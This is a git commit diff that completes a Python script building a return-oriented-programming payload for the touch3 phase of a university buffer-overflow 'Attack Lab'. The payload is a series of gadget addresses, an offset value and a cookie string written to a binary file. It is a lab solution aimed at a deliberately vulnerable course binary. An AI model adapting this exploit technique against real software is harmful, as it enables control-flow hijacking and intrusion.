ca08e8564e16181376299d6bc022500faba20e4a
Freedom <11freedom11@sina.cn>
2024-03-28 18:05:36 +0800

    AttackLab PASS

--- lab/attack/rtarget_touch3.py
+++ lab/attack/rtarget_touch3.py
@@ -33,21 +33,24 @@ mov rax, rdi
 ret <touch3>
 <touch3> 0x4018fa
 """
-OFFSET = 0
+OFFSET = 72
+COOKIE = "59b997fa"
 
 def to_8_bytes(n: int) -> bytes:
     return n.to_bytes(8, "little")
 
-f = open("./rtarget_touch3.bin")
-f.write(int.to_bytes(97, 1)*40)
+f = open("./rtarget_touch3.bin", "wb")
+f.write(int.to_bytes(97, 1, "little")*40)
 f.write(to_8_bytes(0x401a06))
 f.write(to_8_bytes(0x4019a2))
-f.write(to_8_bytes(OFFSET))
 f.write(to_8_bytes(0x4019ab))
+f.write(to_8_bytes(OFFSET))
 f.write(to_8_bytes(0x4019dd))
 f.write(to_8_bytes(0x401a34))
 f.write(to_8_bytes(0x401a27))
 f.write(to_8_bytes(0x4019d6))
 f.write(to_8_bytes(0x4019a2))
 f.write(to_8_bytes(0x4018fa))
+for c in COOKIE:
+    f.write(int.to_bytes(ord(c), 1, "little"))
 f.close()
